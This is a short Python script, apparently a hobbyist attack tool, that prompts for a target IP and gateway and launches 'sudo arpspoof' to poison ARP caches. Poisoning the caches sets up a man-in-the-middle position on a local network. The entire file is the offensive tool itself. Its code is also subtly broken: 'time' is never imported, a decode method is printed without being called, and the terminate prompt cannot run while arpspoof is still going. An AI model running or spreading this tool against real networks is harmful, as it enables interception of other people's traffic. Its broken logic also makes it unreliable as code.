import subprocess

def spoof_arp(target_ip, target_gateway):
    result = subprocess.run('iw dev | grep Interface | cut -f 2 -d " "', shell=True, capture_output=True, text=True)
    iface = result.stdout.strip('\n')
    print("\n\033[35mStart ARP spoofing...")
    spoof = subprocess.Popen(['sudo', 'arpspoof', '-i', f'{iface}', '-t', f'{target_ip}', '-r', f'{target_gateway}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    

    stdout, stderr = spoof.communicate()
    if stderr:
        print(stderr.decode())
    
    print(stdout.decode)
    t = input("\n\033[35mDo you want to terminate? (Y/N): ")
    if t == 'Y' or  t == 'y':
        spoof.kill()
        spoof.wait()

    time.sleep(2)
    
    return 


def initialize():
    art = '''
    .d8888. d8888b.  .d88b.   .d88b.  d88888b 
    88'  YP 88  `8D .8P  Y8. .8P  Y8. 88'     
    `8bo.   88oodD' 88    88 88    88 88ooo   
      `Y8b. 88~~~   88    88 88    88 88~~~   
    db   8D 88      `8b  d8' `8b  d8' 88      
    `8888Y' 88       `Y88P'   `Y88P'  YP      
                                          

    '''
    print(f"\n\033[34m{art}\033[0m")
    target_ip = input("\n\033[36mEnter target ip: ")
    target_gateway = input("\n\033[36mEnter target gateway: ")
    spoof_arp(target_ip, target_gateway)

if __name__ == "__main__":
    initialize()

